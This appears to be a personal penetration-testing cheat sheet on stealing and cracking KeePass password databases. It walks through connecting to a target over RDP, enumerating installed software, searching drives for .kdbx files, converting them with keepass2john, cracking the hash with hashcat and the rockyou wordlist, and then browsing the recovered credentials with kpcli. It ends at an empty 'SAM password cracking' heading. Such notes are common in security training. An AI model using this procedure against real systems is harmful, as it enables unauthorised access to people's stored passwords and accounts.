---
title: Password Manager
updated: 2025-05-12 03:10:32Z
created: 2025-04-24 13:36:01Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Crack KeePass database file

1. Connect to target desktop
eg `xfreerdp /v:<target> /u:<user> /p:<password> /w:1200 /h:700`
2. Check all installed programs using powershell, cmd or GUI:

**powershell**
```
$paths = @(
  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
  "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$programs = foreach ($path in $paths) {
  Get-ItemProperty $path | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
}
$programs | Where-Object { $_.DisplayName } | Sort-Object DisplayName
```
OR
```
Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version | Sort-Object Name
```
***Note**: This can be slow and sometimes triggers repair checks on installed MSI apps, so use with caution.*


**cmd**
```
wmic product get name,version
```

3. Search the filesystem for any database files:
kdbx

**powershell**
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCOntinue
```

**cmd**
```
dir C:\*.kdbx /s /b 2>nul
```
OR
```
for /r C:\ %i in (*.kdbx) do @echo %i 2>nul
```

4. Copy kdbx file to kali and conver with **keepass2john**
`keepass2john Database.kdbx > keepass.hash`
5. Using vi or nano, delete the text **Database:** from the first line of the file (as Keepass users a master password without a username)
6. Check the hashing algorithm (should be AES/Twofish)
`hashcat --help | grep -i "KeePass"`
7. Crack the hash using a rule file with **hashcat**
`hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`

* * *
## kpcli
### Reading the Keepass Database
1. Open the KeePass Database:
`kpcli --kdb myfile.kdbx`

2. Search for creadentials:
`kpcli --kdb secrets.kdbx
kpcli> search admin`

| Command        | Description                  |
| -------------- | ---------------------------- |
| `ls`           | List groups/folders          |
| `cd /group`    | Navigate into a group        |
| `show myentry` | Show details of an entry     |
| `search term`  | Search entries by keyword    |
| `add`          | Add a new entry              |
| `edit`         | Edit an entry                |
| `rm`           | Delete an entry              |
| `save`         | Save changes to the database |
| `exit`         | Exit the interface           |


* * *
## SAM password cracking